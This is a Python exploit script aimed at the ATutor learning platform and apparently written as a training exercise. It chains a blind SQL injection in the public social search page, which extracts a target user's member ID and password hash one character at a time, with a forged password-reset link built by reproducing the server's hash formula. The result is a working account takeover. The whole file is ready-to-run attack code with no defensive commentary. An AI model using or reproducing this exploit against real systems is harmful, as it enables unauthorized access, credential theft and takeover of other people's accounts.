import hashlib, sys, time, requests, re


def gen_link(id,password,baseurl):
    print("Generating password change link")
    # date link was generated (# days since epoch)
    gen = int(((time.time()/60)/60)/24)
    #gen = int(gen)
    # to mimic the hash formula on the server, we need to treat the password value as an integer.
    # we do this by grabbing the integer values from the start of the string to the first letter.
    regex = "^[0-9]*"
    r = re.match(regex,password).group(0)
    if (not r):
        r = 0
    # now add as integers NOT strings!
    encoded_string = str((int(id) + int(gen) + int(r))).encode('utf-8')
    hash = hashlib.sha1(encoded_string).hexdigest()
    hash_bit = hash[5:20]
    print (str(id))
    print (password)
    print(gen)
    print (encoded_string)
    print (hash)
    print (hash_bit)

    change_link = baseurl + "password_reminder.php?id=" + str(id) + "&g=" + str(gen) + "&h=" + str(hash_bit)
    return change_link

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None  

def inject(ip,login):
    id = ""
    query_id = "SELECT/**/member_id/**/from/**/AT_members/**/WHERE/**/login='" + login + "'"
    # get member_id
    print("(+) Retrieving member id....")
    for i in range(1, 2):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (query_id,i)
        retrieved_value = searchFriends_sqli(ip,  injection_string)
        if(retrieved_value):
            id += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            # sys.stdout.write(extracted_char)
            # sys.stdout.flush()
        else:
            print("\n(+) done!")
            break
    print("(+) Retrieving password hash....")
    query_password = "SELECT/**/password/**/from/**/AT_members/**/WHERE/**/login='" + login + "'"
    password = ""
    for i in range(1, 50):
        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (query_password,i)
        retrieved_value = searchFriends_sqli(ip,  injection_string)
        if(retrieved_value):
            password += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            # sys.stdout.write(extracted_char)
            # sys.stdout.flush()
        else:
            print("\n(+) done!")
            break
    return id, password

def main():
    if len(sys.argv) < 3:
        print("usage: %s ip username" % sys.argv[0])
        exit()
    ip = sys.argv[1]
    login = sys.argv[2]
    baseurl = "http://"+ ip +"/ATutor/"

    
    id,password = inject(ip,login)
    #print (id,password)
    #id = 1
    #password = "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e"
    print(gen_link(id,password, baseurl))
    exit()

if __name__ == "__main__":
     main()

